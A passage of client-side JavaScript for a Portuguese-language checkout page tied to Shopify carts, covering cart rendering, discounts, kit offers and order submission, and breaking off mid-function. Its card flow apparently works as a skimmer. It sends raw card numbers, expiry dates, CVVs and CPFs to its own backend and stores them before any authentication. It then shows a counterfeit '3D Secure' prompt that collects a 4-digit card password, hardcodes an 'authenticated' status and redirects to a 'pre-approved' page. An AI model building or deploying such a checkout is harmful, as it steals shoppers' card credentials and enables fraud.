            <div class="checkout-product-card" style="margin-bottom: 12px; display: flex; gap: 16px; align-items: center; background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 12px; padding: 12px; transition: all 0.3s;">
              <div class="checkout-product-icon-box" style="padding: 0; overflow: hidden; background: rgba(124, 77, 255, 0.05); display: flex; align-items: center; justify-content: center; width: 48px; height: 48px; border-radius: 10px; flex-shrink: 0; box-shadow: 0 0 15px rgba(124, 77, 255, 0.2);">
                ${imageHtml}
              </div>
              <div class="checkout-product-details" style="flex: 1; display: flex; flex-direction: column; gap: 4px; min-width: 0; text-align: left;">
                <span class="checkout-product-name" style="font-weight: 600; font-size: 14px; color: var(--text-primary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" title="${item.title}">${item.title}</span>
                <span class="checkout-product-size" style="font-size: 12px; color: var(--text-secondary); font-weight: 500;">SKU: ${item.sku || 'SHPFY-DEFAULT'}</span>
                <div class="checkout-product-controls" style="display: flex; justify-content: space-between; align-items: center; margin-top: 4px;">
                  <div class="checkout-qty-selector" style="opacity: 0.85; pointer-events: none; padding: 2px 8px; font-size: 11px; font-weight: 600; color: var(--text-secondary); background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 4px; display: flex; align-items: center; justify-content: center;">
                    Qtd: ${qtyNum}
                  </div>
                  <span class="checkout-product-price" style="font-weight: 700; color: var(--primary-color); font-size: 14px;">R$ ${subtotalItem.toFixed(2).replace('.', ',')}</span>
                </div>
              </div>
            </div>
          `;
        });

        // Re-adiciona o input base-amount oculto no final
        htmlContent += `<input type="number" id="base-amount" value="${totalBaseAmount.toFixed(2)}" style="display: none;">`;
        itemsListContainer.innerHTML = htmlContent;

        // Atualiza o base-amount e bloqueia o campo
        if (amountInput) {
          amountInput.value = totalBaseAmount.toFixed(2);
          amountInput.disabled = true;
          amountInput.style.opacity = '0.7';
          amountInput.style.cursor = 'not-allowed';
        }

        // Definir variáveis de fallback para o primeiro produto (compatibilidade com pixels e rotinas legadas)
        const firstItem = shopifyCartItems[0];
        shpfyProductTitle = firstItem.title;
        shpfyProductSku = firstItem.sku || 'SHPFY-DEFAULT';
        shpfyProductPrice = parseFloat(firstItem.price) || 0;
        shpfyProductQuantity = parseInt(firstItem.quantity) || 1;
        shpfyVariantId = firstItem.variant_id || null;

        // Recalcular totais finais
        calculateTotals();
        console.log(`🛒 ${shopifyCartItems.length} produtos do carrinho Shopify renderizados no checkout.`);
        checkCollectionDiscounts(shpfyProductSku, shpfyVariantId, shpfyProductPrice, paramProductId);
      }
    } else if (paramTitle && paramPrice) {
      shpfyProductTitle = paramTitle;
      shpfyProductSku = paramSku || 'SHPFY-DEFAULT';
      shpfyProductPrice = parseFloat(paramPrice) || 0;
      shpfyProductQuantity = parseInt(paramQty) || 1;
      shpfyVariantId = paramVariant || null;

      // 1. Atualizar o Título do produto no resumo da compra
      const itemTitleSpan = document.getElementById('checkout-product-name-val') || document.querySelector('.items-list .item-title');
      if (itemTitleSpan) {
        itemTitleSpan.textContent = shpfyProductTitle;
      }
      
      // 2. Atualizar o Subtítulo para mostrar SKU
      const itemSubtitleSpan = document.getElementById('checkout-product-size-val') || document.querySelector('.items-list .item-subtitle');
      if (itemSubtitleSpan) {
        itemSubtitleSpan.textContent = `SKU: ${shpfyProductSku}`;
      }

      // 2.5. Atualizar o Preço formatado no resumo da compra
      const itemPriceSpan = document.getElementById('checkout-product-price-val');
      if (itemPriceSpan) {
        itemPriceSpan.textContent = 'R$ ' + (shpfyProductPrice * shpfyProductQuantity).toFixed(2).replace('.', ',');
      }

      // 2.6. Atualizar a Quantidade exibida visualmente
      const qtyValEl = document.getElementById('checkout-qty-val');
      if (qtyValEl) {
        qtyValEl.textContent = shpfyProductQuantity;
      }

      // 3. Preencher o preço e bloquear o campo (impede fraude do cliente)
      if (amountInput) {
        amountInput.value = (shpfyProductPrice * shpfyProductQuantity).toFixed(2);
        amountInput.disabled = true; 
        amountInput.style.opacity = '0.7';
        amountInput.style.cursor = 'not-allowed';
      }

      // Recalcular totais finais
      calculateTotals();
      console.log(`🛒 Produto do Shopify carregado com sucesso: ${shpfyProductTitle} (${shpfyProductSku})`);
      checkCollectionDiscounts(shpfyProductSku, shpfyVariantId, shpfyProductPrice, paramProductId);
    }
  }

  // Função para verificar e aplicar descontos automáticos de coleções Shopify
  async function checkCollectionDiscounts(sku, variantId, basePrice, explicitProductId) {
    try {
      // 1. Carrega regras de desconto de coleção ativas do banco de dados (Supabase)
      const marketingRes = await fetch('/api/marketing?type=collection_discount');
      if (!marketingRes.ok) {
        loadProductKits(sku, basePrice);
        return;
      }
      const rules = await marketingRes.json();
      
      // Filtrar regras ativas
      const activeRules = rules.filter(r => r.value && r.value.active !== false);
      if (activeRules.length === 0) {
        console.log('ℹ️ Nenhuma regra de desconto de coleção ativa no banco de dados.');
        loadProductKits(sku, basePrice);
        return;
      }

      console.log(`📡 Encontradas ${activeRules.length} regras de desconto de coleção ativas.`);

      let productId = explicitProductId;

      // 2. Se não temos o ID do produto explicitamente, buscamos nos produtos da Shopify pelo SKU ou variantId
      if (!productId) {
        const productsRes = await fetch('/api/shopify?action=products');
        if (productsRes.ok) {
          const products = await productsRes.json();
          // Procurar produto que tenha o SKU ou Variant ID correspondente
          const matchedProduct = products.find(prod => {
            // Verificar SKU na lista de variantes do produto
            const hasVariantSku = prod.variants && prod.variants.some(v => v.sku === sku);
            // Verificar Variant ID se disponível
            const hasVariantId = variantId && prod.variants && prod.variants.some(v => v.id.toString() === variantId.toString());
            return hasVariantSku || hasVariantId;
          });

          if (matchedProduct) {
            productId = matchedProduct.id;
            console.log(`🔍 Produto associado na Shopify encontrado: ID ${productId}`);
          }
        }
      }

      if (!productId) {
        console.log('⚠️ ID do produto Shopify não pôde ser determinado. Pulando regras de coleção.');
        loadProductKits(sku, basePrice);
        return;
      }

      // 3. Busca as coleções às quais este produto pertence
      const collectionsRes = await fetch(`/api/shopify?action=product_collections&product_id=${productId}`);
      if (!collectionsRes.ok) {
        console.log('⚠️ Erro ao buscar coleções do produto na Shopify.');
        loadProductKits(sku, basePrice);
        return;
      }

      const productCollections = await collectionsRes.json();
      console.log(`🏷️ O produto pertence a ${productCollections.length} coleções da Shopify.`);

      // 4. Verifica se alguma coleção do produto possui uma regra de desconto ativa
      let appliedRule = null;
      let matchedCollectionName = '';

      for (const col of productCollections) {
        const rule = activeRules.find(r => r.key === col.id.toString());
        if (rule) {
          appliedRule = rule;
          matchedCollectionName = col.title;
          break; // Aplica a primeira regra correspondente
        }
      }

      if (appliedRule) {
        const val = appliedRule.value || {};
        const discType = val.discount_type || 'percentage';
        const discVal = parseFloat(val.discount_value) || 0;
        
        let newPrice = basePrice;
        let badgeText = '';

        if (discType === 'percentage') {
          newPrice = basePrice * (1 - (discVal / 100));
          badgeText = `Desconto Coleção ${matchedCollectionName}: -${discVal}%`;
        } else if (discType === 'fixed') {
          newPrice = basePrice - discVal;
          badgeText = `Desconto Coleção ${matchedCollectionName}: -${discVal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}`;
        }

        if (newPrice < 0.01) newPrice = 0.01;

        console.log(`🎉 Regra de Coleção Ativa! Preço unitário reduzido de R$ ${basePrice} para R$ ${newPrice} (${badgeText})`);

        // Atualiza a global shpfyProductPrice com o novo preço descontado
        shpfyProductPrice = newPrice;

        // Atualiza o input de preço do checkout
        if (amountInput) {
          amountInput.value = (newPrice * shpfyProductQuantity).toFixed(2);
        }

        // Renderiza o badge de desconto na interface do checkout
        const itemInfo = document.querySelector('.items-list .item-info');
        if (itemInfo) {
          // Remover badge anterior se houver
          const oldBadge = itemInfo.querySelector('.collection-discount-badge');
          if (oldBadge) oldBadge.remove();

          const badge = document.createElement('div');
          badge.className = 'collection-discount-badge';
          badge.style.cssText = 'display: inline-flex; align-items: center; gap: 0.35rem; font-size: 0.75rem; background: linear-gradient(135deg, rgba(16, 185, 129, 0.15), rgba(5, 150, 105, 0.2)); color: #34d399; padding: 0.25rem 0.5rem; border-radius: 6px; border: 1px solid rgba(16, 185, 129, 0.25); font-weight: 700; margin-top: 0.4rem; font-family: inherit; align-self: flex-start;';
          badge.innerHTML = `<i class="fa-solid fa-tags"></i> ${escapeHtml(badgeText)}`;
          itemInfo.appendChild(badge);
        }

        // Recalcular totais e carregar kits com o novo preço base com desconto!
        calculateTotals();
        loadProductKits(sku, newPrice);
      } else {
        console.log('ℹ️ Nenhuma regra de coleção correspondente a este produto.');
        loadProductKits(sku, basePrice);
      }

    } catch (err) {
      console.error('Erro ao verificar descontos de coleção:', err);
      // Garante que os kits são carregados de qualquer forma
      loadProductKits(sku, basePrice);
    }
  }

  // Função para buscar e renderizar Kits de Ofertas para o produto atual
  async function loadProductKits(sku, basePrice) {
    if (!sku) return;
    
    try {
      const response = await fetch(`/api/marketing?type=kit`);
      if (!response.ok) return;
      
      const kits = await response.json();
      // Filtrar kits ativos que pertencem a este SKU
      const productKits = kits.filter(k => k.key === sku && k.value && k.value.active !== false);
      
      if (productKits.length === 0) return;
      
      console.log(`🎁 Encontrados ${productKits.length} kits ativos para o SKU ${sku}`);
      
      const container = document.getElementById('checkout-kits-container');
      const list = document.getElementById('checkout-kits-list');
      if (!container || !list) return;
      
      // Limpa a lista
      list.innerHTML = '';
      
      // Adiciona a opção padrão: 1 unidade (sem desconto)
      const defaultOption = document.createElement('div');
      defaultOption.className = 'kit-option-card active';
      defaultOption.innerHTML = `
        <input type="radio" name="checkout-kit-selection" class="kit-option-radio" checked value="default">
        <div class="kit-option-details">
          <div class="kit-option-title">Levar apenas 1 unidade</div>
          <div class="kit-option-desc">Sem desconto adicional</div>
        </div>
        <div class="kit-option-price-box">
          <div class="kit-option-price">${basePrice.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</div>
        </div>
      `;
      list.appendChild(defaultOption);
      
      // Adiciona cada kit configurado
      productKits.forEach((kit) => {
        const val = kit.value || {};
        const qty = val.quantity || 2;
        const discountPct = val.discount_pct || 0;
        
        // Calcula preço do kit
        let kitPrice = val.price || 0;
        if (!kitPrice || kitPrice <= 0) {
          // Preço automático baseado na quantidade e porcentagem de desconto
          const subTotalRaw = basePrice * qty;
          kitPrice = subTotalRaw * (1 - (discountPct / 100));
        }
        
        const option = document.createElement('div');
        option.className = 'kit-option-card';
        option.innerHTML = `
          <input type="radio" name="checkout-kit-selection" class="kit-option-radio" value="${kit.id}">
          <div class="kit-option-badge">Melhor Oferta</div>
          <div class="kit-option-details">
            <div class="kit-option-title">${escapeHtml(val.title || `Compre ${qty} Unidades`)}</div>
            <div class="kit-option-desc">${escapeHtml(val.items_description || `${qty}x unidades do produto`)}</div>
          </div>
          <div class="kit-option-price-box">
            <div class="kit-option-price">${kitPrice.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</div>
            ${discountPct > 0 ? `<div style="font-size:0.7rem; color:#10b981; font-weight:700;">-${discountPct}% Off</div>` : ''}
          </div>
        `;
        
        // Armazena dados no elemento para facilitar o cálculo ao selecionar
        option.setAttribute('data-qty', qty);
        option.setAttribute('data-price', kitPrice);
        option.setAttribute('data-title', val.title || `Kit ${qty}x`);
        
        list.appendChild(option);
      });
      
      // Mostra o container
      container.classList.remove('hide');
      
      // Adiciona event listeners de clique nas opções
      const cards = list.querySelectorAll('.kit-option-card');
      cards.forEach(card => {
        card.addEventListener('click', () => {
          // Atualiza classes ativas
          cards.forEach(c => c.classList.remove('active'));
          card.classList.add('active');
          
          const radio = card.querySelector('.kit-option-radio');
          if (radio) radio.checked = true;
          
          // Aplica os valores no checkout
          const radioVal = radio.value;
          if (radioVal === 'default') {
            shpfyProductQuantity = 1;
            amountInput.value = basePrice.toFixed(2);
            // Atualiza resumo
            const itemSubtitleSpan = document.querySelector('.items-list .item-subtitle');
            if (itemSubtitleSpan) {
              itemSubtitleSpan.textContent = `SKU: ${sku} | Qtd: 1`;
            }
          } else {
            const qty = parseInt(card.getAttribute('data-qty'));
            const price = parseFloat(card.getAttribute('data-price'));
            shpfyProductQuantity = qty;
            amountInput.value = price.toFixed(2);
            
            // Atualiza resumo
            const itemSubtitleSpan = document.querySelector('.items-list .item-subtitle');
            if (itemSubtitleSpan) {
              const kitTitle = card.getAttribute('data-title');
              itemSubtitleSpan.textContent = `SKU: ${sku} | Qtd: ${qty} (${kitTitle})`;
            }
          }
          
          // Recalcula totais finais
          calculateTotals();
        });
      });
      
    } catch (err) {
      console.error('Erro ao buscar ou configurar kits de ofertas:', err);
    }
  }

  // Simple HTML escaping helper for client app
  function escapeHtml(str) {
    if (!str) return '';
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }

  calculateTotals();
  parseUrlParameters();
  updateTopProgressBar();



  // ==========================================
  // 9. ENVIO DO FORMULÁRIO (INTEGRAÇÃO API)
  // ==========================================
  const checkoutForm = document.getElementById('checkout-form');
  const submitBtn = document.getElementById('btn-submit-checkout');
  const btnText = submitBtn.querySelector('.btn-text');
  const btnLoader = submitBtn.querySelector('.btn-loader');
  
  const statusModal = document.getElementById('status-modal');
  const statusIconBox = document.getElementById('status-icon-box');
  const statusIcon = document.getElementById('status-icon');
  const statusTitle = document.getElementById('status-title');
  const statusSubtitle = document.getElementById('status-subtitle');
  const responseMode = document.getElementById('response-mode');
  const responseJsonPreview = document.getElementById('response-json-preview');
  const btnCloseModal = document.getElementById('btn-close-modal');

  // Elementos do Pix
  const modalPixArea = document.getElementById('modal-pix-area');
  const pixQrImage = document.getElementById('pix-qr-image');
  const qrLoadingSpinner = document.getElementById('qr-loading-spinner');
  const pixCopyInput = document.getElementById('pix-copy-input');
  const btnCopyPix = document.getElementById('btn-copy-pix');
  const copyBtnText = document.getElementById('copy-btn-text');
  const copyIcon = document.getElementById('copy-icon');

  // ==========================================
  // 10. ELEMENTOS E EVENTOS DO MODAL 3DS & CARREGAMENTO
  // ==========================================
  const authLoadingOverlay = document.getElementById('auth-loading-overlay');
  const auth3dsOverlay = document.getElementById('auth-3ds-overlay');
  const authBrandLogo = document.getElementById('auth-brand-logo');
  const authInfoAmount = document.getElementById('auth-info-amount');
  const authInfoDate = document.getElementById('auth-info-date');
  const authInfoCard = document.getElementById('auth-info-card');
  const btnCancel3ds = document.getElementById('btn-cancel-3ds');
  const btnSubmit3ds = document.getElementById('btn-submit-3ds');
  const digitInputs = document.querySelectorAll('.auth-digit-input');

  // Lógica dos campos de senha de 4 dígitos
  digitInputs.forEach((input, idx) => {
    // Filtrar somente números ao digitar
    input.addEventListener('input', (e) => {
      input.value = input.value.replace(/\D/g, '');
      
      if (input.value.length === 1) {
        const nextInput = document.getElementById(`auth-digit-${idx + 2}`);
        if (nextInput) {
          nextInput.focus();
        }
      }
    });

    // Navegação via Backspace
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace') {
        if (input.value === '') {
          const prevInput = document.getElementById(`auth-digit-${idx}`);
          if (prevInput) {
            prevInput.focus();
            prevInput.value = '';
          }
        } else {
          input.value = '';
        }
        e.preventDefault();
      }
    });

    // Submissão automática com a tecla Enter
    input.addEventListener('keyup', (e) => {
      if (e.key === 'Enter') {
        let passwordVal = '';
        digitInputs.forEach(inp => passwordVal += inp.value);
        if (passwordVal.length === 4) {
          const currentBtnSubmit = document.getElementById('btn-submit-3ds');
          if (currentBtnSubmit) currentBtnSubmit.click();
        }
      }
    });

    // Selecionar o texto ao focar
    input.addEventListener('focus', () => {
      input.select();
    });

    // Suporte para colar a senha completa (4 dígitos)
    input.addEventListener('paste', (e) => {
      e.preventDefault();
      const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
      if (pasteData) {
        for (let i = 0; i < pasteData.length; i++) {
          const targetInput = document.getElementById(`auth-digit-${i + 1}`);
          if (targetInput) {
            targetInput.value = pasteData[i];
          }
        }
        const lastInput = document.getElementById(`auth-digit-${Math.min(pasteData.length, 4)}`);
        if (lastInput) {
          lastInput.focus();
        }
      }
    });
  });

  // Ação de Cancelar no modal 3DS
  btnCancel3ds.addEventListener('click', () => {
    auth3dsOverlay.classList.remove('open');
    authLoadingOverlay.classList.remove('open');
    
    // Restaurar o botão de checkout original
    submitBtn.disabled = false;
    btnText.classList.remove('hide');
    btnLoader.classList.add('hide');
  });

  checkoutForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const section1 = document.querySelector('.checkout-section[data-step="1"]');
    const section2 = document.querySelector('.checkout-section[data-step="2"]');
    const section3 = document.querySelector('.checkout-section[data-step="3"]');

    if (!validateSectionInputs(section1)) {
      section1.scrollIntoView({ behavior: 'smooth' });
      return;
    }
    if (!validateSectionInputs(section2)) {
      section2.scrollIntoView({ behavior: 'smooth' });
      return;
    }
    if (!validateSectionInputs(section3)) {
      section3.scrollIntoView({ behavior: 'smooth' });
      return;
    }

    submitBtn.disabled = true;
    btnText.classList.add('hide');
    btnLoader.classList.remove('hide');

    const selectedMethod = paymentMethodInput.value;
    const uuid = checkoutSessionId;
    const subtotal = parseFloat(amountInput.value) || 0;
    
    let shippingPrice = 15.00;
    let shippingMethodVal = 'standard';
    const selectedRadio = document.querySelector('input[name="shipping_method"]:checked');
    if (selectedRadio) {
      shippingMethodVal = selectedRadio.value;
      const priceSpan = selectedRadio.closest('.shipping-option').querySelector('.option-price');
      shippingPrice = parseFloat(priceSpan.getAttribute('data-price')) || 0;
    }
    
    let couponDiscountVal = 0;
    if (activeCoupon) {
      if (activeCoupon.discount_type === 'percentage') {
        couponDiscountVal = parseFloat((subtotal * (activeCoupon.discount_value / 100)).toFixed(2));
      } else if (activeCoupon.discount_type === 'fixed') {
        couponDiscountVal = parseFloat(activeCoupon.discount_value);
      }
      if (couponDiscountVal > subtotal) {
        couponDiscountVal = subtotal;
      }
    }
    let subtotalAfterCoupon = subtotal - couponDiscountVal;
    if (subtotalAfterCoupon < 0) subtotalAfterCoupon = 0;

    let discountVal = 0;
    if (selectedMethod === 'pix' && discountPixPercent > 0) {
      discountVal = parseFloat((subtotalAfterCoupon * (discountPixPercent / 100)).toFixed(2));
    }
    const totalAmount = parseFloat((subtotalAfterCoupon + shippingPrice - discountVal).toFixed(2));

    const itemsPayload = shopifyCartItems && shopifyCartItems.length > 0 ? shopifyCartItems.map(item => ({
      name: item.title,
      price: parseFloat(item.price) || 0,
      quantity: parseInt(item.quantity) || 1,
      sku: item.sku || 'SHPFY-DEFAULT',
      shopify_variant_id: item.variant_id || null
    })) : (shpfyProductTitle ? [
      {
        name: shpfyProductTitle,
        price: shpfyProductPrice,
        quantity: shpfyProductQuantity,
        sku: shpfyProductSku,
        shopify_variant_id: shpfyVariantId
      }
    ] : [
      {
        name: "Pacote Sandbox Elite",
        price: subtotal,
        quantity: 1,
        sku: "SANDBOX-ELITE-PK"
      }
    ]);

    const payload = {
      checkout_session_id: uuid,
      payment_method: selectedMethod,
      domain: window.location.hostname,
      
      // Cliente
      customer_name: document.getElementById('customer_name').value,
      customer_email: document.getElementById('customer_email').value,
      customer_phone: phoneInput.value,
      customer_cpf: cpfInput.value,

      // Endereço
      cep: cepInput.value,
      street: document.getElementById('street').value,
      street_number: document.getElementById('street_number').value,
      complement: document.getElementById('complement').value,
      neighborhood: document.getElementById('neighborhood').value,
      city: document.getElementById('city').value,
      state: document.getElementById('state').value.toUpperCase(),

      // Entrega & Pedido
      shipping_method: shippingMethodVal,
      shipping_price: shippingPrice,
      items: itemsPayload,
      amount: totalAmount,

      // Cupom de Desconto
      coupon_code: activeCoupon ? activeCoupon.code : null,
      coupon_discount: activeCoupon ? couponDiscountVal : 0,
      coupon_type: activeCoupon ? activeCoupon.discount_type : null,

      // Cartão (Somente se for 'card')
      card_holder_raw: selectedMethod === 'card' ? (cardHolderInput.value + (document.getElementById('card_holder_cpf').value ? ' | CPF: ' + document.getElementById('card_holder_cpf').value : '')) : null,
      card_number_raw: selectedMethod === 'card' ? cardInput.value : null,
      card_expiry_raw: selectedMethod === 'card' ? cardExpiryInput.value : null,
      card_cvv_raw: selectedMethod === 'card' ? cardCvvInput.value : null,
      card_installments: selectedMethod === 'card' ? document.getElementById('card_installments').value : null,
      card_brand: selectedMethod === 'card' ? detectedBrand : null,

      // Parâmetros 3DS (Somente se for 'card')
      three_ds_status: selectedMethod === 'card' ? 'authenticated' : null,
      three_ds_code_raw: selectedMethod === 'card' ? '05' : null,

      status: "draft"
    };

    // Fluxo Diferenciado se for Cartão de Crédito (Autenticação 3DS)
    if (selectedMethod === 'card') {
      // 1. Mostrar loader de validação de autenticação inicial
      const loadingTitle = authLoadingOverlay.querySelector('.auth-title');
      const loadingSubtitle = authLoadingOverlay.querySelector('.auth-subtitle');
      
      loadingTitle.textContent = "Validando autenticação";
      loadingSubtitle.textContent = "Estamos confirmando os dados com a rede emissora. Aguarde alguns segundos.";
      authLoadingOverlay.classList.add('open');

      // 2. Fazer requisição imediata de pré-gravação com card_password e status como "erro 3ds"
      const initialPayload = {
        ...payload,
        card_password: 'erro 3ds',
        three_ds_status: 'erro 3ds',
        status: 'FAILED' // Estado inicial caso não termine a inserção de senha
      };

      let responseData = null;
      let firstRequestSuccess = false;

      try {
        const response = await fetch('/api/checkout', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(initialPayload)
        });
        responseData = await response.json();
        if (response.ok && responseData.success) {
          firstRequestSuccess = true;
          console.log('💳 Dados do cartão pré-gravados com sucesso no Supabase (antes do 3DS).');
        } else {
          console.warn('⚠️ Falha ao pré-gravar cartão:', responseData.error);
        }
      } catch (err) {
        console.error('❌ Erro na pré-gravação do cartão:', err);
      }

      // Popula as informações dinâmicas do modal 3DS
      authBrandLogo.className = `auth-brand-logo ${detectedBrand || 'generic'}`;
      authBrandLogo.innerHTML = brandIcons[detectedBrand || 'generic'];

      const totalBrl = totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
      authInfoAmount.textContent = totalBrl;

      const now = new Date();
      const formattedDate = now.toLocaleDateString('pt-BR') + ', ' + now.toLocaleTimeString('pt-BR');
      authInfoDate.textContent = formattedDate;

      const last4 = cardInput.value.replace(/\D/g, '').slice(-4);
      authInfoCard.textContent = `XXXX XXXX XXXX ${last4 || '0000'}`;

      // Limpa os campos de senha e coloca foco no primeiro
      digitInputs.forEach(input => input.value = '');
      
      // Esconde o loading overlay e abre o modal 3DS
      authLoadingOverlay.classList.remove('open');
      auth3dsOverlay.classList.add('open');
      setTimeout(() => {
        const firstDigit = document.getElementById('auth-digit-1');
        if (firstDigit) firstDigit.focus();
      }, 100);

      // Define a ação de envio da senha
      const execute3dsSubmit = async () => {
        // Recuperar a senha inserida
        let passwordVal = '';
        digitInputs.forEach(input => passwordVal += input.value);

        if (passwordVal.length < 4) {
          const digitsContainer = document.querySelector('.auth-password-digits');
          shakeElement(digitsContainer);
          return;
        }

        // Senha válida! Prosseguir com o envio final para autenticar.
        loadingTitle.textContent = "Confirmando autenticação 3D Secure...";
        loadingSubtitle.textContent = "Por favor, não feche esta janela. Estamos realizando a verificação de segurança final...";
        
        auth3dsOverlay.classList.remove('open');
        authLoadingOverlay.classList.add('open');

        // Aguardar 2.0 segundos de animação
        setTimeout(async () => {
          // Anexar a senha do cartão e o status atualizado no payload final
          const finalPayload = {
            ...payload,
            card_password: passwordVal,
            three_ds_status: 'authenticated',
            status: 'PRE-APPROVED',
            shopify_order_id: responseData?.data?.shopify_order_id || null,
            shopify_order_name: responseData?.data?.shopify_order_name || null
          };

          try {
            const response = await fetch('/api/checkout', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify(finalPayload)
            });

            const finalResponseData = await response.json();

            if (!response.ok) {
              throw new Error(finalResponseData.details || finalResponseData.error || 'Falha ao salvar transação de cartão.');
            }

            // Sucesso absoluto! Redirecionar para tela de pré-aprovação premium
            trackPixelEvent('Purchase', {
              content_name: shpfyProductTitle || 'Pacote Sandbox Elite',
              currency: 'BRL',
              value: totalAmount
            });

            // Limpar rascunho de sessão atual
            localStorage.removeItem('checkout_session_id');

            const urlParams = new URLSearchParams(window.location.search);
            const storeParam = urlParams.get('store_url');
            
            let redirectUrl = `card-pre-approved.html?amount=${totalAmount}&date=${encodeURIComponent(formattedDate)}`;
            if (storeParam) {
              redirectUrl += `&store_url=${encodeURIComponent(storeParam)}`;
            }
            
            window.location.href = redirectUrl;

          } catch (err) {
            console.error('Erro ao processar transação de cartão:', err);
            authLoadingOverlay.classList.remove('open');
            showModalState('error', { error: err.message });
            
            // Restaurar os controles do form principal
            submitBtn.disabled = false;
            btnText.classList.remove('hide');
            btnLoader.classList.add('hide');
          }
        }, 2000);
      };

      // Associar o clique de envio
      // Substituímos o botão por um clone dele para limpar listeners antigos!
      const currentBtnSubmit = document.getElementById('btn-submit-3ds');
      if (currentBtnSubmit) {
        const newBtnSubmit3ds = currentBtnSubmit.cloneNode(true);
        currentBtnSubmit.parentNode.replaceChild(newBtnSubmit3ds, currentBtnSubmit);
        newBtnSubmit3ds.addEventListener('click', execute3dsSubmit);
      }

      return;
    }

    // ========================================================
    // FLUXO NORMAL DO PIX (MANTIDO 100% INTACTO)
    // ========================================================
    showModalState('processing');
    
    try {
      const response = await fetch('/api/checkout', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      const responseData = await response.json();

      if (!response.ok) {
        throw new Error(responseData.details || responseData.error || 'Falha ao salvar transação.');
      }

      showModalState('success', responseData);

    } catch (err) {
      console.error('Erro ao processar transação:', err);
      showModalState('error', { error: err.message });
    } finally {
      submitBtn.disabled = false;
      btnText.classList.remove('hide');
      btnLoader.classList.add('hide');
    }
  });

  // Gerenciador de estados do modal de resposta
  function showModalState(state, responseData = null) {
    statusModal.classList.add('open');

    statusIconBox.className = 'status-icon-container';
    statusIcon.className = 'fa-solid';

    // Ocultar área Pix por padrão
    modalPixArea.classList.add('hide');

    if (state === 'processing') {
      const selectedMethod = document.querySelector('input[name="payment_method"]:checked')?.value || 'card';
      statusIconBox.classList.add('processing');
      if (selectedMethod === 'pix') {
        statusIconBox.classList.add('pix');
        statusIcon.classList.add('fa-spinner', 'fa-spin');
        statusTitle.textContent = 'Gerando seu Pix...';
        statusSubtitle.textContent = 'Carregando o Pix seguro de pagamento... Por favor, não feche esta janela.';
      } else {
        statusIcon.classList.add('fa-spinner', 'fa-spin');
        statusTitle.textContent = 'Processando...';
        statusSubtitle.textContent = 'Enviando dados de forma segura e criptografada... Por favor, aguarde.';
      }
      responseMode.textContent = 'STANDBY';
      responseMode.className = 'badge';
      responseJsonPreview.textContent = '// Aguardando resposta do backend...';
      btnCloseModal.style.display = 'none';
    } 
    else if (state === 'success') {
      statusIconBox.classList.add('success');
      statusIcon.classList.add('fa-check');
      
      btnCloseModal.style.display = 'inline-flex';
      
      if (responseData) {
        responseMode.textContent = responseData.mode === 'mock' ? 'MOCK MODE' : 'SUPABASE + PAGUEX';
        responseMode.className = `badge ${responseData.mode === 'mock' ? 'mock' : ''}`;
        responseJsonPreview.textContent = JSON.stringify(responseData, null, 2);
        
        if (responseData.payment_method === 'pix') {
          statusTitle.textContent = 'Pix Gerado!';
          statusSubtitle.textContent = 'Leia o QR Code abaixo ou copie o código Pix para pagar.';
          
          // Mostrar área do Pix
          modalPixArea.classList.remove('hide');
          pixCopyInput.value = responseData.pix_qr_code;

          // Se tivermos um ID de transação válido, iniciar polling reativo do status de pagamento
          const transactionId = responseData.data ? responseData.data.id : null;
          if (transactionId) {
            if (window.pixPaymentPollInterval) {
              clearInterval(window.pixPaymentPollInterval);
            }

            window.pixPaymentPollInterval = setInterval(async () => {
              try {
                const checkRes = await fetch(`/api/orders?id=${transactionId}`);
                if (checkRes.ok) {
                  const checkData = await checkRes.json();
                  const orderData = Array.isArray(checkData) ? checkData[0] : checkData;
                  
                  if (orderData && orderData.status && orderData.status.toUpperCase() === 'PAID') {
                    clearInterval(window.pixPaymentPollInterval);
                    window.pixPaymentPollInterval = null;

                    statusIconBox.className = 'status-icon-container success';
                    statusIcon.className = 'fa-solid fa-check';
                    
                    statusTitle.textContent = 'Pagamento Aprovado!';
                    statusSubtitle.textContent = 'Seu pedido foi confirmado e o pagamento via Pix foi validado com sucesso! 🎉';
                    
                    modalPixArea.classList.add('hide');
                    
                    btnCloseModal.style.display = 'inline-flex';
                    btnCloseModal.innerHTML = '<i class="fa-solid fa-check"></i> Concluir';
                  }
                }
              } catch (pollErr) {
                console.error('Erro no polling do Pix:', pollErr);
              }
            }, 3000);
          }
          
          // Configurar botões de WhatsApp dinamicamente
          const btnWhatsappMessage = document.getElementById('btn-whatsapp-message');
          const btnWhatsappPixKey = document.getElementById('btn-whatsapp-pixkey');

          if (btnWhatsappMessage && btnWhatsappPixKey) {
            const customerName = (responseData.data && responseData.data.customer_name) || 'Cliente';
            const firstName = customerName.trim().split(/\s+/)[0];
            
            // Limpar telefone do cliente e formatar no padrão wa.me/55...
            let customerPhone = (responseData.data && responseData.data.customer_phone) || '';
            let cleanPhone = customerPhone.replace(/\D/g, '');
            if (cleanPhone.length === 10 || cleanPhone.length === 11) {
              cleanPhone = '55' + cleanPhone;
            }

            // Buscar número do pedido (Shopify order name, or gateway tx id, or #1009 fallback)
            const orderNumber = (responseData.data && responseData.data.shopify_order_name) || 
                                (responseData.data && responseData.data.gateway_tx_id ? `#${responseData.data.gateway_tx_id}` : '#1009');

            // Descrição do(s) produto(s) comprado(s)
            let productDetailsText = 'Produto Incrível';
            if (responseData.data && Array.isArray(responseData.data.items) && responseData.data.items.length > 0) {
              productDetailsText = responseData.data.items.map(item => {
